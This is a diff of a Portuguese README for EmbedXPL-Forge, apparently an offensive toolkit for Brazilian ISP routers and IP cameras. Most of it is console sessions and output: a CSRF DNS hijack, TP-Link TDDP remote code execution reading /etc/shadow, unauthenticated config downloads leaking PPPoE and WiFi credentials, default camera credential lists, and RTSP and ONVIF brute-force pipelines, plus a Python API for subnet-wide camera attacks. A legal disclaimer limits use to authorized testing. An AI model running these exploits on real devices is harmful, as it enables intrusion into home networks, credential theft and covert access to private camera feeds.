+exf (GF1200 SNMP) > run
+
+[*] Consultando SNMP community 'public' em 192.168.1.1:161...
+[+] System Description: Intelbras GF1200 v1.2.3
+[+] Interface WAN: ppp0 IP=177.x.x.x
+[+] Hostname: Intelbras-GF1200-XXXXXX
+[+] Uptime: 12 dias 4 horas
+[+] PPPoE username: cliente@provedor.com.br (OID 1.3.6.1.2.1.2.2.1.2.1)
+
+# Intelbras W5-1200F - CSRF DNS hijack
+exf > use exploits/routers/intelbras/w5_1200f_csrf_dns_hijack
+exf (W5-1200F CSRF) > set target 192.168.1.1
+exf (W5-1200F CSRF) > set dns1 8.8.8.8
+exf (W5-1200F CSRF) > set dns2 1.1.1.1
+exf (W5-1200F CSRF) > run
+
+[*] Enviando requisição CSRF para /cgi-bin/set_dns_server.cgi...
+[+] DNS primário alterado: 8.8.8.8
+[+] DNS secundário alterado: 1.1.1.1
+[!] Sem token CSRF - a requisição foi aceita sem autenticação
+```
+
+### TP-Link / Sagemcom (Claro TV Box, NET, provedores regionais)
+
+| Modelo | ISP | Vulnerabilidade | Módulo |
+|--------|-----|-----------------|--------|
+| TD-W9970 | TIM Fibra | CVE-2020-10882 - RCE via tddp (port 1040 UDP) | `exploits/routers/tplink/td_w9970_tddp_rce_cve_2020_10882` |
+| Archer VR400 | Diversos | CVE-2021-41538 - password disclosure via `/cgi-bin/luci` | `exploits/routers/tplink/archer_vr400_passwd_disclosure` |
+| Sagemcom F@ST 5655v2 | Vivo Fibra | Config download via `http://192.168.15.1/config.bin` sem auth | `exploits/routers/sagemcom/fast5655_config_download` |
+| Sagemcom F@ST 3764 | Claro/NET | Backdoor SSH com chave privada embutida no firmware | `exploits/routers/sagemcom/fast3764_hardcoded_ssh_key` |
+
+```bash
+# TP-Link TD-W9970 CVE-2020-10882 - TDDP RCE
+exf > use exploits/routers/tplink/td_w9970_tddp_rce_cve_2020_10882
+exf (TD-W9970 TDDP RCE) > set target 192.168.1.1
+exf (TD-W9970 TDDP RCE) > check
+
+[*] Verificando CVE-2020-10882 em 192.168.1.1:1040 (UDP)...
+[+] Porta TDDP 1040/UDP respondendo
+[+] VULNERÁVEL - Versão TDDP < 1.1 detectada
+
+exf (TD-W9970 TDDP RCE) > set cmd "cat /etc/shadow"
+exf (TD-W9970 TDDP RCE) > run
+
+[+] Execução remota via TDDP protocolo
+[+] root:$1$xxx...:0:0:root:/:/bin/sh
+
+# Sagemcom F@ST 5655v2 - config download
+exf > use exploits/routers/sagemcom/fast5655_config_download
+exf (Sagemcom Config DL) > set target 192.168.15.1
+exf (Sagemcom Config DL) > run
+
+[*] Baixando config.bin de http://192.168.15.1/config.bin...
+[+] Arquivo obtido: config.bin (328 KB)
+[+] Descriptografando configuração...
+[+] PPPoE user: cliente@vivo.com.br
+[+] PPPoE pass: [REDACTED - exibir com: set show_creds true]
+[+] WiFi SSID: VivoFibra-XXXX
+[+] WiFi WPA2 Key: [REDACTED]
+```
+
+> **Aviso Legal:** Os módulos ISP Brasil destinam-se exclusivamente a testes de penetração autorizados
+> em equipamentos de sua propriedade ou com autorização escrita do cliente/provedor.
+> Acesso não autorizado a sistemas de terceiros é crime (Lei 12.737/12 - Lei Carolina Dieckmann).
+
+---
+
+## FCC-ID Lookup
+
+Consulta ao banco de dados público da FCC (Federal Communications Commission) para recuperar documentação técnica de qualquer dispositivo sem fio registrado: firmware original, manual de serviço, fotos internas, relatórios de teste SAR/RF.
+
+```bash
+# Consultar dispositivo pelo FCC-ID
+exf > use generic/fccid/fcc_id_lookup
+exf (FCC-ID Lookup) > set fcc_id 2ADLE-F670L
+exf (FCC-ID Lookup) > run
+
+[*] Consultando FCC database para: 2ADLE-F670L
+[+] Fabricante: ZTE Corporation
+[+] Grantee Code: 2ADLE
+[+] Produto: ZXHN F670L (GPON ONT)
+[+] Aprovado em: 2021-03-15
+[+] Frequências: 2.4 GHz (802.11b/g/n), 5 GHz (802.11a/n/ac)
+[+] Documentos disponíveis:
+    - User Manual: https://apps.fcc.gov/eas/GetApplicationAttachment.html?id=...
+    - Internal Photos: https://apps.fcc.gov/eas/GetApplicationAttachment.html?id=...
+    - RF Test Report: https://apps.fcc.gov/eas/GetApplicationAttachment.html?id=...
+    - Firmware (se disponível): https://apps.fcc.gov/eas/GetApplicationAttachment.html?id=...
+
+# Busca por fabricante + modelo
+exf > use generic/fccid/fcc_id_lookup
+exf (FCC-ID Lookup) > set search_grantee "Intelbras"
+exf (FCC-ID Lookup) > set search_description "GF1200"
+exf (FCC-ID Lookup) > run
+
+[*] Buscando dispositivos Intelbras com 'GF1200'...
+[+] FCC-ID: Q87-GF1200 | Produto: GF1200 | Aprovado: 2019-08-22
+[+] FCC-ID: Q87-GF1200V2 | Produto: GF1200 v2 | Aprovado: 2020-11-10
+[*] Use 'set fcc_id Q87-GF1200' para obter detalhes e documentos
+
+# Extrair firmware de documentos FCC (quando disponível)
+exf > use generic/fccid/fcc_firmware_extractor
+exf (FCC Firmware) > set fcc_id 2ADLE-F670L
+exf (FCC Firmware) > set output_dir /tmp/fcc_firmware
+exf (FCC Firmware) > run
+
+[*] Procurando anexos de firmware para 2ADLE-F670L...
+[+] Encontrado: V1.0.0P5T16_D30.bin (12.4 MB)
+[+] Download concluído: /tmp/fcc_firmware/2ADLE-F670L_firmware.bin
+[*] Para análise: use generic/firmware/firmware_analyzer
+```
+
+---
+
+## iSpy Camera DB
+
+Integração com o banco de dados iSpy (ispyconnect.com/cameras) contendo 6.000+ modelos de câmeras com rotas RTSP testadas, credenciais padrão por fabricante e configurações de conexão.
+
+```bash
+# Buscar rotas RTSP por fabricante
+exf > use generic/ispydb/ispy_camera_lookup
+exf (iSpy DB) > set vendor Hikvision
+exf (iSpy DB) > run
+
+[*] Consultando iSpy Camera DB para: Hikvision
+[+] 47 modelos encontrados
+[+] Rotas RTSP mais comuns:
+    /Streaming/Channels/101      (Main stream - alta resolução)
+    /Streaming/Channels/102      (Sub stream - baixa resolução)
+    /h264/ch1/main/av_stream     (formato legado)
+    /h264/ch1/sub/av_stream      (sub stream legado)
+[+] Credenciais padrão: admin/(vazio), admin/12345, admin/admin123
+[+] Porta padrão: 554 (RTSP), 8000 (SDK), 80/443 (HTTP)
+
+# Buscar câmera específica
+exf > use generic/ispydb/ispy_camera_lookup
+exf (iSpy DB) > set vendor Intelbras
+exf (iSpy DB) > set model "VIP 1020"
+exf (iSpy DB) > run
+
+[*] Buscando Intelbras VIP 1020 na iSpy DB...
+[+] Modelo: Intelbras VIP 1020 B
+[+] Rota RTSP: /cam/realmonitor?channel=1&subtype=0
+[+] Credenciais padrão: admin/(vazio)
+[+] Porta: 554
+[+] URL completa: rtsp://admin:@<IP>:554/cam/realmonitor?channel=1&subtype=0
+
+# Enriquecer scan RTSP com dados iSpy
+exf > use exploits/cameras/multi/rtsp_cameradar_attack
+exf (RTSP Cameradar Attack) > set target 192.168.1.0/24
+exf (RTSP Cameradar Attack) > set use_ispy_db true
+exf (RTSP Cameradar Attack) > run
+
+[*] Escaneando 192.168.1.0/24 nas portas 554, 5554, 8554...
+[*] Host com RTSP detectado: 192.168.1.100:554
+[*] Fingerprint: Hikvision DS-2CD2143G2-I (iSpy DB match)
+[*] Aplicando rotas e credenciais específicas para Hikvision...
+[+] Rota descoberta: /Streaming/Channels/101
+[+] Credenciais: admin:(vazio)
+[+] Stream acessível: rtsp://admin:@192.168.1.100:554/Streaming/Channels/101
+```
+
+---
+
+## Motor RTSP - Uso Avançado
+
+Motor RTSP completo portado do [cameradar](https://github.com/ullaakut/cameradar) e estendido com funcionalidades nativas em Python.
+
+### Modos de Transporte
+
+| Modo | Porta | Descrição |
+|------|-------|-----------|
+| `rtsp` | 554 | RTSP padrão via TCP |
+| `rtsps` | 443/8443 | RTSP sobre TLS |
+| `http` | 80/8080 | Tunelamento RTSP-over-HTTP (RFC 2326 App-C) |
+| `https` | 443/8443 | Tunelamento RTSP-over-HTTPS |
+| `auto` | any | Detecção automática do modo pelo host/porta |
+
+### Pipeline de Ataque Completo
+
+```bash
+# Ataque RTSP completo em sub-rede
+exf > use exploits/cameras/multi/rtsp_cameradar_attack
+exf (RTSP Cameradar Attack) > set target 192.168.1.0/24
+exf (RTSP Cameradar Attack) > set ports 554,5554,8554,8080
+exf (RTSP Cameradar Attack) > set timeout 5.0
+exf (RTSP Cameradar Attack) > set output_m3u /tmp/cameras.m3u
+exf (RTSP Cameradar Attack) > run
+
+[*] Escaneando 192.168.1.0/24 nas portas [554, 5554, 8554, 8080]...
+[*] Hosts RTSP encontrados: 3
+[*] 192.168.1.100:554 - Fase 1: Descoberta de rota (195 rotas)...
+[*] 192.168.1.100:554 - Rota encontrada: h264/ch1/main/av_stream
+[*] 192.168.1.100:554 - Fase 2: Detecção de auth - Basic (realm="IP Camera")
+[*] 192.168.1.100:554 - Fase 3: Brute-force de credenciais (80 pares)...
+[+] 192.168.1.100:554 - Credenciais: admin:(vazio)
+[+] 192.168.1.100:554 - Stream validado (200 OK)
+[*] Ataque concluído. Streams acessíveis: 2/3
+[+] Playlist M3U salva: /tmp/cameras.m3u
+
+# Tunelamento RTSP-over-HTTP (câmeras atrás de proxy)
+exf > use exploits/cameras/multi/rtsp_http_tunnel_attack
+exf (RTSP-over-HTTP) > set target 10.0.0.50
+exf (RTSP-over-HTTP) > set port 8080
+exf (RTSP-over-HTTP) > run
+
+[*] Iniciando tunelamento RTSP-over-HTTP para 10.0.0.50:8080...
+[*] Enviando GET /stream com x-sessioncookie...
+[*] Enviando POST /stream com RTSP DESCRIBE encapsulado...
+[+] Tunnel estabelecido - câmera responde via HTTP
+[+] Rota: /video.mjpg
+[+] URL: http://10.0.0.50:8080/video.mjpg
+
+# ONVIF WS-Discovery + ataque
+exf > use exploits/cameras/multi/onvif_ws_discovery
+exf (ONVIF Discovery) > set subnet 192.168.1.0/24
+exf (ONVIF Discovery) > run
+
+[*] Enviando WS-Discovery Probe para 239.255.255.250:3702...
+[+] Dispositivo ONVIF: 192.168.1.105 (Dahua IPC-HDW2831T-AS)
+[+] Dispositivo ONVIF: 192.168.1.110 (Hikvision DS-2CD2T47G2-L)
+[*] Iniciando ataque de credenciais ONVIF...
+[+] 192.168.1.105 - admin:admin123 (ONVIF + RTSP)
+[+] Stream: rtsp://admin:admin123@192.168.1.105:554/cam/realmonitor
+```
+
+### API Python - Uso Programático
+
+```python
+from embedxpl.core.rtsp.scanner  import RTSPScanner
+from embedxpl.core.rtsp.attacker import RTSPAttacker
+
+# 1. Descobrir hosts RTSP na rede
+scanner = RTSPScanner(timeout=5.0)
+hosts = scanner.scan_network("192.168.1.0/24", ports=[554, 5554, 8554])
+# Retorna: [('192.168.1.100', 554), ('192.168.1.101', 8554), ...]
+
+# 2. Executar pipeline de ataque completo (5 fases)
+attacker = RTSPAttacker(timeout=5.0)
+results = attacker.attack_all(hosts)
+
+# 3. Inspecionar resultados
+for stream in results:
+    print(stream.url)         # rtsp://admin:@192.168.1.100:554/h264/ch1/main/av_stream
+    print(stream.username)    # admin
+    print(stream.password)    # (string vazia)
+    print(stream.route)       # h264/ch1/main/av_stream
+    print(stream.auth_type)   # AuthType.BASIC
+    print(stream.accessible)  # True
+
+# 4. Atacar hosts conhecidos diretamente (sem scan)
+hosts = scanner.skip_scan(["192.168.1.100:554", "192.168.1.101"])
+results = attacker.attack_all(hosts)
+```
+
+---
 
 ## Requisitos
 
@@ -524,4 +605,8 @@ EmbedXPL-Forge é destinado exclusivamente para testes de segurança autorizados
 
 ## Licença
 
-Licença BSD — veja [LICENSE](LICENSE) para detalhes.
+Licença BSD - veja [LICENSE](LICENSE) para detalhes.
+
+---
+
+**Autor:** André Henrique ([@mrhenrike](https://github.com/mrhenrike)) | [União Geek](https://github.com/Uniao-Geek)
